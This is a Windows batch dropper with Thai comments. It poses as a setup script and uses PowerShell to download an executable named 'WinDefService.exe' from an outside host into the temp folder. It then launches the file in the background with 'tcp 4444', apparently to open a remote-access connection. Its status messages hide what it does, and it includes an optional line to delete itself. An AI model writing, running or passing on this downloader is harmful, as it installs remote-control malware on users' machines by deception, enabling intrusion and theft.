@echo off
:: ตั้งค่าตัวแปร
set "URL=https://0dev.io/WinDefService.exe"
set "SAVE_PATH=%TEMP%\dragon_client.exe"

echo [+] Initializing setup...

:: ใช้ PowerShell (ที่มีติดเครื่อง Windows ทุกเครื่อง) โหลดไฟล์
powershell -Command "Invoke-WebRequest -Uri '%URL%' -OutFile '%SAVE_PATH%'"

:: ตรวจสอบว่าโหลดมาสำเร็จไหม
if exist "%SAVE_PATH%" (
    echo [+] Setup complete. Starting service...
    :: รันไฟล์ที่โหลดมาในรูปแบบ Background (ไม่รอให้จบ)
    start "" "%SAVE_PATH%" tcp 4444
) else (
    echo [-] Error: Connection failed.
)

:: ลบตัวเองทิ้ง (ทางเลือก)
:: (del "%~f0" & exit)
exit